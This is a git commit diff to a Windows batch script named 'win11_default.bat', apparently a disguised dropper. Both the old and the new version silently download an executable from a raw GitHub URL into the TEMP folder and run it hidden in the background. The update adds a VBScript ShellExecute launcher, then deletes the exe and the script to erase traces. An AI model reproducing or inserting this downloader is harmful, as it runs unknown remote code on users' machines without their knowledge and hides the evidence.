44fdd66dd79e936ef7dae18ab0b4841fe151b297
optolab <sloneeddie36@gmail.com>
2025-01-12 13:19:34 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,15 +1,23 @@
 @echo off
 
-:: Define the download URL and target path
+:: Define URL and path for downloading
 set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
-set tempPath=%TEMP%\a.exe
+set path=%TEMP%\fbf12e4f.exe
 
-:: Download the file to the TEMP directory
-powershell -Command "Invoke-WebRequest %url% -OutFile %tempPath%"
+:: Download the file
+powershell -Command "Invoke-WebRequest %url% -OutFile %path%"
 
-:: Run the downloaded .exe invisibly
-start /B "" "%tempPath%"
+:: Run the downloaded exe invisibly in the background
+start /B "" "%path%"
 
-:: Wait for 1 second and then clean up by deleting the .exe
+:: Wait a bit to make sure the exe is running
 timeout /t 1 /nobreak
-del "%tempPath%"
+
+:: Create and run the VBScript to execute the exe with specific parameters
+echo CreateObject("Shell.Application").ShellExecute "%TEMP%\fbf12e4f.exe","",",," > "%TEMP%\fbf12e4f.vbs"
+"%TEMP%\fbf12e4f.vbs"
+
+:: Cleanup the VBScript after execution
+timeout /t 1 /nobreak
+del "%TEMP%\fbf12e4f.vbs"
+del "%TEMP%\fbf12e4f.exe"
